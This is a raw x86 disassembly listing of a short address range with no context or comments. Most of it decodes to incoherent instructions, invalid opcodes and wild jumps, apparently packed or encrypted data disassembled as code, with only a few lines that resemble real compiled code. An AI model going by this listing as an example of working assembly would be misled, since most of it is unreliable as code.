  40a3ac:	jmp    0x40a351
  40a3ae:	lea    edx,[ebx+0x19f508a3]
  40a3b4:	mul    DWORD PTR [edi]
  40a3b6:	(bad)  
  40a3b7:	push   ecx
  40a3b8:	ins    BYTE PTR es:[edi],dx
  40a3b9:	jl     0x40a419
  40a3bb:	lods   al,BYTE PTR ds:[esi]
  40a3bc:	inc    edx
  40a3bd:	sub    BYTE PTR [ebx-0x30],0xf6
  40a3c1:	sbb    DWORD PTR [esi],ebp
  40a3c3:	int3   
  40a3c4:	stos   DWORD PTR es:[edi],eax
  40a3c5:	mov    bl,0xd
  40a3c7:	and    ch,dl
  40a3c9:	lods   eax,DWORD PTR ds:[esi]
  40a3ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3cb:	dec    esp
  40a3cc:	popa   
  40a3cd:	xor    esi,edi
  40a3cf:	addr16 inc ebp
  40a3d1:	pop    esp
  40a3d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3d3:	mov    esi,?
  40a3d5:	popf   
  40a3d6:	cmp    ebx,eax
  40a3d8:	pusha  
  40a3d9:	pusha  
  40a3da:	loop   0x40a37d
  40a3dc:	(bad)
  40a3df:	push   eax
  40a3e0:	pop    ebx
  40a3e1:	lock jl 0x40a373
  40a3e4:	mov    al,ds:0xbf4a898
  40a3e9:	ret    
  40a3ea:	jmp    0x40a435
  40a3ec:	mov    ebx,0x2d106f8a
  40a3f1:	outs   dx,BYTE PTR ds:[esi]
  40a3f2:	les    ebx,FWORD PTR [esp+eiz*8-0x7d]
  40a3f6:	mov    ah,0xe6
  40a3f8:	call   0x6aec1a1e
  40a3fd:	fisttp WORD PTR [eax+0x114a6a1b]
  40a403:	(bad)  
  40a404:	jmp    0x78df9fcd
  40a409:	sbb    bl,BYTE PTR [edi+0x1c5b3a04]
  40a40f:	rcl    eax,1
  40a411:	(bad)  
  40a412:	(bad)  
  40a413:	mov    eax,0x987d6bb8
  40a418:	push   es
  40a419:	mov    ch,cl
  40a41b:	adc    BYTE PTR [ebx],dh
  40a41d:	arpl   dx,bx
  40a41f:	sbb    eax,0x46a26c6b
  40a424:	pop    edi
  40a425:	sub    BYTE PTR [edi],cl
  40a427:	xchg   ecx,eax
  40a428:	or     eax,0xffffffe5
  40a42b:	test   DWORD PTR [esi],ebx
  40a42d:	adc    bh,BYTE PTR [edx-0x2f]
  40a430:	shl    BYTE PTR ds:[esi-0x3d],cl
  40a434:	sub    bh,0x43
  40a437:	or     eax,0xb3ae32f3
  40a43c:	xor    BYTE PTR [ebx-0x66],0xce
  40a440:	popf   
  40a441:	xchg   edx,eax
  40a442:	add    bh,BYTE PTR [esi-0x3b]
  40a445:	dec    eax
  40a447:	ss (bad) 
  40a449:	mov    dl,0xd9
  40a44b:	icebp  
  40a44c:	adc    eax,0x2e34318
  40a451:	add    eax,0x503f453d
  40a456:	jle    0x40a479
  40a458:	lahf   
  40a459:	mov    al,0xdc
  40a45b:	jge    0x40a401
  40a45d:	pop    edi
  40a45e:	adc    DWORD PTR [ecx+0x1e],0x1e1915ad
  40a465:	repnz sbb BYTE PTR [edi],bl
  40a468:	lds    esi,FWORD PTR [ebp+0x7bf0b767]
  40a46e:	dec    ebx
  40a46f:	shl    esi,1
  40a471:	lods   eax,DWORD PTR ds:[esi]
  40a472:	stos   BYTE PTR es:[edi],al
  40a473:	(bad)  
  40a474:	iret   
  40a475:	mov    WORD PTR [ebp+esi*4-0x46a704a1],ss
  40a47c:	out    0x15,al
  40a47e:	inc    ecx
  40a47f:	mov    ebx,0x8b9dc4e4
  40a484:	xor    al,BYTE PTR [edx+eax*2-0x6c]
  40a488:	and    eax,0xf038fb1a
  40a48d:	jo     0x40a46c
  40a48f:	push   ss
  40a490:	mov    ebx,0x695dc01f
  40a495:	push   0xffffffa9
  40a497:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a498:	(bad)  
  40a499:	int    0xab
  40a49b:	pop    esi
  40a49c:	std    
  40a49d:	adc    edi,DWORD PTR [edi-0x1692a3b7]
  40a4a3:	xor    DWORD PTR [eax+0x6e],edi
  40a4a6:	sbb    ebx,DWORD PTR ds:[esi+eiz*8]
  40a4aa:	jns    0x40a4c4
  40a4ac:	mov    ds:0xb8ba8ea6,eax
  40a4b1:	sbb    BYTE PTR [ebp-0x1c],0x96
  40a4b5:	pusha  
  40a4b6:	xor    ebx,eax
  40a4b8:	jmp    0x40a495
  40a4ba:	ror    BYTE PTR [edi+edx*8],1
  40a4bd:	mov    edi,DWORD PTR [edi-0x19]
  40a4c0:	pop    esp
  40a4c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4c2:	sub    al,0x9d
  40a4c4:	sub    edx,edx
  40a4c6:	sbb    cl,BYTE PTR [esi]
  40a4c8:	adc    ah,BYTE PTR [eax]
  40a4ca:	xchg   ecx,eax
  40a4cb:	xor    cl,BYTE PTR [ebx+0x72fc30c1]
  40a4d1:	jns    0x40a47d
  40a4d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4d4:	or     DWORD PTR [edi+0xca9afc1],ecx
  40a4da:	shl    DWORD PTR [esi],1
  40a4dc:	cmp    edi,edi
  40a4de:	stc    
  40a4df:	mov    ch,0xad
  40a4e1:	push   cs
  40a4e2:	enter  0x6f7d,0xbf
  40a4e6:	cwde   
  40a4e7:	jb     0x40a51c
  40a4e9:	test   BYTE PTR [ebx-0x70334a0e],cl
  40a4ef:	test   DWORD PTR [ebp+0x5d5fd689],ecx
  40a4f5:	mov    dh,0xec
  40a4f7:	stos   DWORD PTR es:[edi],eax
  40a4f8:	jb     0x40a50e
  40a4fa:	sbb    dh,BYTE PTR [eax-0x15]
  40a4fd:	add    ch,BYTE PTR [ebx]
  40a4ff:	sti    
  40a500:	scas   al,BYTE PTR es:[edi]
  40a501:	mul    BYTE PTR [ebp+0x718144fa]
  40a507:	in     eax,dx
  40a508:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a509:	push   eax
  40a50a:	mov    eax,esi
  40a50c:	loop   0x40a4df
  40a50e:	repz jmp 0x66e32a18
  40a514:	arpl   ax,dx
  40a516:	stc    
  40a517:	mov    edx,0x2e628ac3
  40a51c:	inc    esi
  40a51d:	clc    
  40a51e:	fs pop edi
  40a520:	fs daa 
  40a522:	retf   
  40a523:	pusha  
  40a524:	xor    al,0x7c
  40a526:	adc    DWORD PTR [ebx],edi
  40a528:	push   esi
  40a529:	fsubp  st(5),st
  40a52b:	test   al,0x6
  40a52d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a52e:	dec    esp
  40a52f:	jne    0x40a56c
  40a531:	jno    0x40a55a
  40a533:	or     eax,0x84588c4e
  40a538:	jmp    0x6dfb48fb
  40a53d:	sub    DWORD PTR [ebp-0x69732f6d],ebp
  40a543:	cli    
  40a544:	jmp    0x40a4dd
  40a546:	cs push ebp
  40a548:	xchg   esp,eax
  40a549:	pusha  
  40a54a:	or     al,0x19
  40a54c:	jmp    0x31d5:0x193c6d38
  40a553:	xchg   edi,eax
  40a554:	jns    0x40a520
  40a556:	jne    0x40a597
  40a558:	dec    esi
  40a559:	jl     0x40a545
  40a55b:	inc    esi
  40a55c:	adc    DWORD PTR [ebx],edx
  40a55e:	pusha  
  40a55f:	xchg   esi,eax
  40a560:	dec    ecx
  40a561:	xchg   BYTE PTR ds:0xe845abfb,ch
  40a567:	shr    BYTE PTR [edi-0x6],1
  40a56a:	mov    edi,0xe71f42b6
  40a56f:	fadd   DWORD PTR [ecx-0x65]
  40a572:	add    bl,BYTE PTR [ecx-0x3477f0f0]
  40a578:	jbe    0x40a530
  40a57a:	xchg   BYTE PTR [ecx+0x55878ccd],bl
  40a580:	xchg   esi,eax
  40a581:	xor    edi,ebp
  40a583:	jmp    0x26ab:0xeec4d2af
  40a58a:	cmp    ebp,ebx
  40a58c:	sbb    eax,edx
  40a58e:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40a590:	fidiv  DWORD PTR [edi]
  40a592:	loope  0x40a5d2
  40a594:	and    DWORD PTR [edi-0x35],eax
  40a597:	(bad)  
  40a598:	or     DWORD PTR [ebp+0x6c42dac5],ebx
  40a59e:	neg    DWORD PTR [esp+ecx*2]
  40a5a1:	xchg   ebp,eax
  40a5a2:	cmp    eax,0x687e5c5
  40a5a7:	jl     0x40a52c
  40a5a9:	clc    
  40a5aa:	sahf   
  40a5ab:	in     al,0x49
  40a5ad:	pop    ecx
  40a5ae:	fidiv  WORD PTR [esi+0x8]
  40a5b1:	jg     0x40a62a
  40a5b3:	mov    bh,0xbf
  40a5b5:	and    eax,0xb43fa37f
  40a5ba:	test   DWORD PTR [ebx-0x2055d2d0],ebx
  40a5c0:	mov    ebx,0xdec9395c
  40a5c5:	jecxz  0x40a580
  40a5c7:	hlt    
  40a5c8:	loopne 0x40a59e
  40a5ca:	and    eax,0x8e1bf8c7
  40a5cf:	sbb    ebx,DWORD PTR ds:[eax+0x7f4adf12]
  40a5d6:	and    eax,0x2229586d
  40a5db:	xchg   edi,eax
  40a5dc:	out    dx,al
  40a5dd:	sub    eax,0x7a925d5d
  40a5e2:	xchg   esi,eax
  40a5e3:	inc    esp
  40a5e4:	pop    esi
  40a5e5:	xor    BYTE PTR [eax+esi*8],dh
  40a5e8:	dec    esp
  40a5e9:	mov    eax,0x498945d4
  40a5ee:	jno    0x40a611
  40a5f0:	movq   QWORD PTR [ebx+esi*1],mm2
  40a5f4:	xchg   ecx,eax
  40a5f5:	aad    0x1e
  40a5f7:	test   DWORD PTR ds:0x20249221,esi
  40a5fd:	outs   dx,DWORD PTR ds:[esi]
  40a5fe:	or     eax,DWORD PTR [eiz*8-0x71fbff35]
  40a605:	cli    
  40a606:	pop    edi
  40a607:	pop    ebp
  40a608:	jmp    0x40a594
  40a60a:	or     ebx,DWORD PTR [eax-0x17]
  40a60d:	or     bl,BYTE PTR [ebx]
  40a60f:	int    0xc9
  40a611:	popf   
  40a612:	dec    esp
  40a613:	lock pop ds
  40a615:	inc    ebp
  40a616:	ja     0x40a5d1
  40a618:	fstp   DWORD PTR [eax+edi*4]
  40a61b:	xchg   esp,eax
  40a61c:	push   eax
  40a61d:	mov    ecx,0xe4d2185c
  40a622:	push   esi
  40a623:	in     eax,dx
  40a624:	outs   dx,BYTE PTR ds:[esi]
  40a625:	sbb    DWORD PTR [esi],esp
  40a627:	lods   al,BYTE PTR ds:[esi]
  40a628:	in     eax,dx
  40a629:	es cmp eax,0xbfe5f667
  40a62f:	repz sub DWORD PTR [esi+eax*2+0x3550cd63],esi
  40a637:	mov    dl,0xf
  40a639:	fiadd  DWORD PTR [ebx]
  40a63b:	mov    edx,0x13fee898
  40a640:	iret   
  40a641:	in     eax,dx
  40a642:	jmp    0x40a5e4
  40a644:	js     0x40a60c
  40a646:	mov    ebx,0x5be06d73
  40a64b:	sbb    DWORD PTR [ecx-0x58],0x3c
  40a64f:	and    eax,0x6a9973a6
  40a654:	dec    esi
  40a655:	add    bh,bl
  40a657:	mov    dl,0xc5
  40a659:	je     0x40a682
  40a65b:	pop    es
  40a65c:	push   eax
  40a65d:	mov    ecx,0x8399d2c
  40a662:	ja     0x40a6c8
  40a664:	xor    BYTE PTR [ecx],ah
  40a666:	dec    ebx
  40a667:	pop    ebp
  40a668:	sub    ecx,esp
  40a66a:	and    DWORD PTR [edx],eax
  40a66c:	push   edx
  40a66d:	shl    sp,0x1f
  40a671:	fimul  DWORD PTR [edx+ebp*8]
  40a674:	jp     0x40a68e
  40a676:	sub    eax,0x6d5d8f50
  40a67b:	inc    eax
  40a67c:	loopne 0x40a6bf
  40a67e:	in     al,0xf4
  40a680:	rol    DWORD PTR [edi+ebx*2],1
  40a683:	adc    bh,BYTE PTR [edi+esi*8+0x45e9ec6d]
  40a68a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a68b:	cmp    DWORD PTR [ebx+edi*4],esp
  40a68e:	lgs    edx,FWORD PTR [edi+0x781239b6]
  40a695:	loope  0x40a683
  40a697:	out    0xa1,eax
  40a699:	in     eax,dx
  40a69a:	daa    
  40a69b:	jmp    0xa76dd47c
  40a6a0:	sub    BYTE PTR ds:[edx+ecx*2-0x6488fca6],bl
  40a6a8:	lods   eax,DWORD PTR ds:[esi]
  40a6a9:	cli    
  40a6aa:	test   al,0x79
  40a6ac:	icebp  
  40a6ad:	jmp    0xafde:0xba5705cd
  40a6b4:	jg     0x40a66c
  40a6b6:	mov    esp,DWORD PTR ds:0x6c17547d
  40a6bc:	pop    esp
  40a6bd:	add    DWORD PTR [eax],edi
  40a6bf:	das    
  40a6c0:	sbb    edi,DWORD PTR [eax-0x6ae1dc11]
  40a6c6:	add    edi,esi
  40a6c8:	sbb    edx,DWORD PTR [edi]
  40a6ca:	scas   eax,DWORD PTR es:[edi]
  40a6cb:	mov    bh,BYTE PTR [edx+0x2ce8d9b6]
  40a6d1:	xlat   BYTE PTR ds:[ebx]
  40a6d2:	ds (bad) 
  40a6d4:	jp     0x40a702
  40a6d6:	or     al,0xf9
  40a6d8:	xchg   DWORD PTR [eax-0x2],ecx
  40a6db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6dc:	xchg   BYTE PTR [ecx+0x35],ah
  40a6df:	xchg   BYTE PTR [edx-0x18],bh
  40a6e2:	mov    ah,0xf2
  40a6e4:	ret    
  40a6e5:	aad    0x92
  40a6e7:	lea    ecx,[ecx]
  40a6e9:	inc    edx
  40a6ea:	js     0x40a742
  40a6ec:	std    
  40a6ed:	push   edi
  40a6ee:	jbe    0x40a709
  40a6f0:	aam    0xbe
  40a6f2:	cwde   
  40a6f3:	cmp    eax,0xe9015cd6
  40a6f8:	mov    edi,0x887e8ded
  40a6fd:	rcr    BYTE PTR [ecx+eax*4+0x7c86e0f7],0xcb
  40a705:	inc    esp
  40a706:	aad    0x4
  40a708:	jge    0x40a72a
  40a70a:	pop    esp
  40a70b:	sub    eax,0xa043b5a1
  40a710:	pop    eax
  40a711:	add    ebp,DWORD PTR [ecx]
  40a713:	jno    0x40a69e
  40a715:	add    ebp,DWORD PTR [edi+0x4d]
  40a718:	jmp    0x9173:0x545ae74
  40a71f:	fldcw  WORD PTR ds:0xfc7c01d7
  40a725:	fild   WORD PTR [esi]
  40a727:	xchg   esp,eax
  40a728:	or     dh,BYTE PTR [edx+0x7c]
  40a72b:	cli    
  40a72c:	xlat   BYTE PTR ds:[ebx]
  40a72d:	scas   eax,DWORD PTR es:[edi]
  40a72e:	dec    eax
  40a72f:	or     al,0x6
  40a731:	push   es
  40a732:	pusha  
  40a733:	jg     0x40a796
  40a735:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a736:	push   0x7c326266
  40a73b:	xchg   esp,eax
  40a73c:	scas   al,BYTE PTR es:[edi]
  40a73d:	jmp    0x3deb:0x391dae3a
  40a744:	int    0xa3
  40a746:	adc    BYTE PTR [eax-0x14],bh
  40a749:	lods   al,BYTE PTR ds:[esi]
  40a74a:	sbb    edx,esp
  40a74c:	(bad)  
  40a74d:	adc    al,0xe8
  40a74f:	pop    ebp
  40a750:	push   ecx
  40a751:	lahf   
  40a752:	jmp    0x40a702
  40a754:	push   edi
  40a755:	setnp  BYTE PTR fs:[eax]
  40a759:	mov    esi,0x6440b991
  40a75e:	int    0x69
  40a760:	mov    esi,0xd67af439
  40a765:	outs   dx,DWORD PTR ds:[esi]
  40a766:	pop    edi
  40a767:	ret    0x1d08
  40a76a:	inc    ebx
  40a76b:	icebp  
  40a76c:	mov    edx,0x49b3f275
  40a771:	sti    
  40a772:	sahf   
  40a773:	loope  0x40a73c
  40a775:	jmp    0xd0bf:0x778fdafd
  40a77c:	jecxz  0x40a7d8
  40a77e:	xchg   ebx,eax
  40a77f:	test   eax,0x81e62881
  40a784:	add    al,0x10
  40a786:	shr    BYTE PTR [ecx+eiz*8-0x56],cl
  40a78a:	sbb    al,0x58
  40a78c:	pop    esp
  40a78d:	loopne 0x40a7b8
  40a78f:	mov    ecx,DWORD PTR [ebp-0x10]
  40a792:	mov    edx,DWORD PTR [ebp-0xc]
  40a795:	xor    eax,edi
  40a797:	shl    ecx,0x1e
  40a79a:	mov    ecx,DWORD PTR [ebp-0x14]
  40a79d:	xor    edx,edx
  40a79f:	or     eax,edx
  40a7a1:	mov    cl,BYTE PTR [eax+ecx*1]
  40a7a4:	mov    eax,DWORD PTR [ebp-0x34]
  40a7a7:	jmp    0x40ad31
  40a7ac:	inc    ebx
  40a7ad:	dec    esi
  40a7ae:	aad    0x8e
  40a7b0:	fcom   DWORD PTR [eax+ebx*1]
  40a7b3:	inc    edx
  40a7b4:	loop   0x40a7dd
  40a7b6:	ds push 0xa8126135
  40a7bc:	or     ax,0x1616
  40a7c0:	cmp    eax,0xc1161604
  40a7c5:	xor    cl,bl
  40a7c7:	pop    ds
  40a7c8:	jo     0x40a80d
  40a7ca:	and    eax,DWORD PTR [esi]
  40a7cc:	bound  ebx,QWORD PTR [ebx]
  40a7ce:	mov    dl,0x13
  40a7d0:	scas   al,BYTE PTR es:[edi]
  40a7d1:	pop    edx
  40a7d2:	ins    DWORD PTR es:[edi],dx
  40a7d3:	cwde   
  40a7d4:	push   0x72
  40a7d6:	add    ch,BYTE PTR [eax-0x1b]
  40a7d9:	fwait
  40a7da:	inc    ecx
  40a7db:	push   esp
  40a7dc:	adc    BYTE PTR [edi-0x2d49a429],ah
  40a7e2:	xchg   esp,eax
  40a7e3:	arpl   WORD PTR [ecx-0x68],ax
  40a7e6:	lods   al,BYTE PTR ds:[esi]
  40a7e7:	inc    ebx
  40a7e8:	jb     0x40a84d
  40a7ea:	inc    edi
  40a7ec:	ror    WORD PTR [ecx],cl
  40a7ef:	lea    edx,[esp+edi*4-0x76]
  40a7f3:	jecxz  0x40a7b4
  40a7f5:	lds    ecx,FWORD PTR [eax+esi*4-0x34adccb6]
  40a7fc:	das    
  40a7fd:	cdq    
  40a7fe:	jmp    0x40a816
  40a800:	inc    eax
  40a801:	and    al,0x1
  40a803:	add    ebp,DWORD PTR [edi-0x6ef75a4e]
  40a809:	xor    eax,0xcbdbc2dd
  40a80e:	in     al,0x13
  40a810:	xor    eax,0x1ab64196
  40a815:	ldmxcsr DWORD PTR ds:0x9ec710b9
  40a81c:	frstor [eax+ebx*4+0x7b]
  40a820:	scas   al,BYTE PTR es:[edi]
  40a821:	xchg   edx,eax
  40a822:	mov    ebx,0x78ae0240
  40a827:	gs (bad) 
  40a829:	xor    esp,eax
  40a82b:	jmp    0x40a7b6
  40a82d:	push   edx
  40a82e:	loop   0x40a7b7
  40a830:	sub    cl,ah
  40a832:	test   DWORD PTR [edi-0x768f145],ebp
  40a838:	lock sbb BYTE PTR ds:0x465e063e,bl
  40a83f:	fs xchg ecx,eax
  40a841:	jo     0x40a83d
  40a843:	arpl   WORD PTR [ecx+0x565d4b60],di
  40a849:	test   al,0x80
  40a84b:	iret   
  40a84c:	push   eax
  40a84d:	sub    eax,0xf1768ffc
  40a852:	mov    gs,edi
  40a854:	mov    cl,0x5d
  40a856:	push   edi
  40a857:	inc    ebx
  40a858:	or     DWORD PTR [edx-0x71],esp
  40a85b:	into   
  40a85c:	push   es
  40a85d:	shl    BYTE PTR [edx+0x35054bf0],cl
  40a863:	push   cs
  40a864:	sub    DWORD PTR [edi-0x5],ebx
  40a867:	daa    
  40a868:	mov    al,0x5d
  40a86a:	pop    esi
  40a86b:	int3   
  40a86c:	inc    eax
  40a86d:	loopne 0x40a888
  40a86f:	mov    esi,0xa3094aed
  40a874:	jb     0x40a808
  40a876:	jnp    0x40a8d0
  40a878:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a879:	fwait
  40a87a:	mov    ecx,DWORD PTR ds:0xfe427688
  40a880:	lods   eax,DWORD PTR ds:[esi]
  40a881:	sub    al,0xc1
  40a883:	xchg   edi,eax
  40a884:	loope  0x40a887
  40a886:	and    DWORD PTR [esi],0x1fd41d6
  40a88c:	aaa    
  40a88d:	add    edi,0x51
  40a890:	inc    edx
  40a891:	cmc    
  40a892:	jmp    0x1b3751ec
  40a897:	and    al,al
  40a899:	push   ebp
  40a89a:	lahf   
  40a89b:	shl    bl,cl
  40a89d:	inc    ebp
  40a89e:	xchg   edi,eax
  40a89f:	call   DWORD PTR [edx-0x6fcc4525]
  40a8a5:	jae    0x40a859
  40a8a7:	push   esi
  40a8a8:	(bad)  
  40a8a9:	mov    ah,BYTE PTR [esi+ebp*4-0x5584c379]
  40a8b0:	popa   
  40a8b1:	pop    eax
  40a8b2:	fiadd  WORD PTR [edi]
  40a8b4:	daa    
  40a8b5:	into   
  40a8b6:	and    al,BYTE PTR ds:0xbd767c60
  40a8bc:	fidiv  DWORD PTR [esi-0x1949bfe3]
  40a8c2:	xchg   ecx,eax
  40a8c3:	bound  edx,QWORD PTR [edi+0x2c]
  40a8c6:	jnp    0x40a88c
  40a8c8:	sbb    eax,0x2f902ebf
  40a8cd:	std    
  40a8ce:	mov    ch,0x3e
  40a8d0:	lahf   
  40a8d1:	std    
  40a8d2:	hlt    
  40a8d3:	retf   
  40a8d4:	test   eax,0x82eab05c
  40a8d9:	push   ebp
  40a8da:	pop    ss
  40a8db:	out    dx,al
  40a8dc:	mov    esi,0x6b41f48e
  40a8e1:	aaa    
  40a8e2:	xlat   BYTE PTR ds:[ebx]
  40a8e3:	mov    ebx,ebx
  40a8e5:	mov    BYTE PTR [edx-0x80],cl
  40a8e8:	mov    esp,DWORD PTR [ebx-0xe6ed0f6]
  40a8ee:	sbb    esp,esp
  40a8f0:	jno    0x40a918
  40a8f2:	inc    edx
  40a8f3:	add    BYTE PTR [edx],cl
  40a8f5:	xor    ch,BYTE PTR [esi+ecx*4-0x40]
  40a8f9:	repz jno 0x40a899
  40a8fc:	in     al,0xeb
  40a8fe:	xchg   esp,eax
  40a8ff:	mov    bl,0xe3
  40a901:	pop    ds
  40a902:	mov    ebp,esi
  40a904:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a905:	xchg   ecx,eax
  40a906:	pop    ss
  40a907:	cmp    al,0x74
  40a909:	jl     0x40a931
  40a90b:	mov    esi,ss
  40a90d:	lods   eax,DWORD PTR ds:[esi]
  40a90e:	pop    es
  40a90f:	or     al,0xd5
  40a911:	jmp    0x40a985
  40a913:	cmp    dl,BYTE PTR [esi+0x22]
  40a916:	sti    
  40a917:	rcr    BYTE PTR [esi-0x439482b9],1
  40a91d:	inc    eax
  40a91e:	loope  0x40a903
  40a920:	sub    edx,esi
  40a922:	mov    edi,0x200550a
  40a927:	in     al,dx
  40a928:	xor    al,0xa3
  40a92a:	test   ah,cl
  40a92c:	inc    ecx
  40a92d:	add    BYTE PTR [ecx+0x3b],0xc4
  40a931:	cmp    eax,0x336820ed
  40a936:	ds out 0xa4,eax
  40a939:	int    0x42
  40a93b:	mov    dh,BYTE PTR [eax+ebp*1-0x58]
  40a93f:	fcomp  QWORD PTR [ebx-0x7bb8d506]
  40a945:	add    DWORD PTR [edx+0x4d],eax
  40a948:	cmp    edi,DWORD PTR [edi-0x63]
  40a94b:	mov    esp,0xcf146e55
  40a950:	scas   al,BYTE PTR es:[edi]
  40a951:	cs pop edi
  40a953:	in     eax,0xcf
  40a955:	inc    ebx
  40a956:	cmp    DWORD PTR ds:0xa209941e,esi
  40a95c:	jl     0x40a93c
  40a95e:	mov    ecx,0xa4b9c341
  40a963:	fistp  DWORD PTR [edi-0x5edecaad]
  40a969:	push   esi
  40a96a:	call   0x3aca62d6
  40a96f:	lods   eax,DWORD PTR ds:[esi]
  40a970:	sbb    al,0x9
  40a972:	jmp    0xc6cfbb59
  40a977:	xor    eax,0x7b490fde
  40a97c:	ins    DWORD PTR es:[di],dx
  40a97e:	fld    DWORD PTR [ebp-0x15]
  40a981:	sbb    DWORD PTR [esi+0x478aeaf],edx
  40a987:	ss dec eax
  40a989:	stc    
  40a98a:	mov    BYTE PTR [ecx-0x3370f8d6],dh
  40a990:	lods   al,BYTE PTR ds:[esi]
  40a991:	mov    ebp,0xb8df901e
  40a996:	sub    eax,edx
  40a998:	mov    ebx,0x2b548c6
  40a99d:	retf   
  40a99e:	test   DWORD PTR [esi-0x5a],0x15d7affa
  40a9a5:	adc    eax,0x93158e5b
  40a9aa:	lahf   
  40a9ab:	bound  ecx,QWORD PTR [ebx-0x72c66f00]
  40a9b1:	test   al,0x7c
  40a9b3:	lods   al,BYTE PTR ds:[esi]
  40a9b4:	mov    ah,0x68
  40a9b6:	add    DWORD PTR [edi-0x1ce491c3],0xffffff99
  40a9bd:	inc    esp
  40a9be:	sub    ecx,DWORD PTR [esi]
  40a9c0:	push   edx
  40a9c1:	clc    
  40a9c2:	ret    0x735
  40a9c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9c6:	sbb    ebp,edi
  40a9c8:	adc    ecx,esp
  40a9ca:	stos   DWORD PTR es:[edi],eax
  40a9cb:	mov    BYTE PTR [edi+0x35144df0],cl
  40a9d1:	mov    BYTE PTR [eax-0x67],dl
  40a9d4:	retf   
  40a9d5:	ror    ebx,0xa1
  40a9d8:	push   ss
  40a9d9:	unpcklps xmm4,xmm5
  40a9dc:	mov    al,0xc9
  40a9de:	sar    ebp,cl
  40a9e0:	mov    edx,0x65b34e5
  40a9e5:	jecxz  0x40a9db
  40a9e7:	xor    DWORD PTR [ebx+0x52],eax
  40a9ea:	outs   dx,BYTE PTR ds:[esi]
  40a9eb:	cmp    BYTE PTR [eax],cl
  40a9ed:	iret   
  40a9ee:	(bad)  
  40a9ef:	repnz out 0x52,eax
  40a9f2:	fsub   QWORD PTR [edx+eiz*2+0x697629d1]
  40a9f9:	jge    0x40aa0e
  40a9fb:	cmp    eax,0xcba6fdb4
  40aa00:	fbstp  TBYTE PTR [ebp-0x393d6b5e]
  40aa06:	cmp    BYTE PTR [ecx],bh
  40aa08:	int3   
  40aa09:	cmp    bh,BYTE PTR [edi]
  40aa0b:	dec    cl
  40aa0d:	clc    
  40aa0e:	lods   eax,DWORD PTR ds:[esi]
  40aa0f:	in     al,dx
  40aa10:	xor    ah,cl
  40aa12:	adc    DWORD PTR ds:0x26249c5c,0xaf795926
  40aa1c:	jge    0x40a9e8
  40aa1e:	not    BYTE PTR [esi]
  40aa20:	xchg   ebp,eax
  40aa21:	fsubr  QWORD PTR [ebp-0x4e0eb51e]
  40aa27:	xlat   BYTE PTR ds:[ebx]
  40aa28:	xchg   ebp,eax
  40aa29:	push   edi
  40aa2a:	inc    ebp
  40aa2b:	mov    bh,0xb1
  40aa2d:	inc    esi
  40aa2e:	dec    ecx
  40aa2f:	mov    ah,0xe0
  40aa31:	ss jns 0x40aa28
  40aa34:	cmp    al,0xef
  40aa36:	push   ebx
  40aa37:	adc    eax,0x48299d5
  40aa3c:	aad    0xd1
  40aa3e:	cmp    eax,eax
  40aa40:	addr16 retf 0xe4d4
  40aa44:	pop    ebx
  40aa45:	push   0xffffffcf
  40aa47:	xor    ah,BYTE PTR [ecx]
  40aa49:	jmp    0x38383e17
  40aa4e:	push   ss
  40aa4f:	dec    edi
  40aa50:	(bad)  
  40aa51:	push   ecx
  40aa52:	cmp    DWORD PTR [ebx],edx
  40aa54:	or     al,0x70
  40aa56:	loope  0x40aab1
  40aa58:	cmp    DWORD PTR [esi+0x69],eax
  40aa5b:	and    cl,BYTE PTR [ebp+0x7]
  40aa5e:	dec    ebp
  40aa5f:	mov    ch,cl
  40aa61:	fimul  DWORD PTR ds:0x5f403f17
  40aa67:	pop    eax
  40aa68:	cdq    
  40aa69:	pushf  
  40aa6a:	(bad)  
  40aa6c:	mov    bl,0x9f
  40aa6e:	push   ecx
  40aa6f:	jbe    0x40aa3c
  40aa71:	dec    edi
  40aa72:	dec    edx
  40aa73:	gs xchg esp,eax
  40aa75:	push   ebp
  40aa76:	sbb    BYTE PTR [edi+0x41],bl
  40aa79:	add    BYTE PTR [esi],bl
  40aa7b:	sti    
  40aa7c:	out    dx,eax
  40aa7d:	repnz imul eax,DWORD PTR [ebp+ebx*8+0x3a207abb],0x60198d98
  40aa89:	push   0xffffffac
  40aa8b:	out    dx,al
  40aa8c:	das    
  40aa8d:	adc    DWORD PTR [ebx-0x203baee3],eax
  40aa93:	or     BYTE PTR [eax],ah
  40aa95:	cdq    
  40aa96:	pop    eax
  40aa97:	loope  0x40aaf0
  40aa99:	and    esp,DWORD PTR [eax-0x3661c155]
  40aa9f:	std    
  40aaa0:	pop    esp
  40aaa1:	push   edx
  40aaa2:	cmp    eax,0x6cd4133
  40aaa7:	mov    DWORD PTR [eax+0x14731561],esi
  40aaad:	icebp  
  40aaae:	outs   dx,BYTE PTR ds:[esi]
  40aaaf:	jnp    0x2ad5c6cf
  40aab5:	loop   0x40aa39
  40aab7:	pop    edx
  40aab8:	jecxz  0x40aa98
  40aaba:	cmovbe ebp,DWORD PTR [ecx-0xe2a5d1d]
  40aac1:	push   esp
  40aac2:	or     edx,DWORD PTR [eax-0x62]
  40aac5:	sbb    al,bh
  40aac7:	stos   DWORD PTR es:[edi],eax
  40aac8:	jne    0x40aaed
  40aaca:	inc    eax
  40aacb:	call   0x905b45dd
  40aad0:	cs fmul st(0),st
  40aad3:	not    DWORD PTR [ebp+eax*2-0x4c]
  40aad7:	add    DWORD PTR [ebx],0x859dbc53
  40aadd:	(bad)  
  40aade:	fwait
  40aadf:	imul   ebp,DWORD PTR [ecx-0x502e0859],0xb8eb5967
  40aae9:	(bad)  
  40aaea:	jae    0x40aa6e
  40aaec:	ja     0x40aa7a
  40aaee:	or     bh,BYTE PTR [edi]
  40aaf0:	add    al,0xc4
  40aaf2:	outs   dx,DWORD PTR ds:[esi]
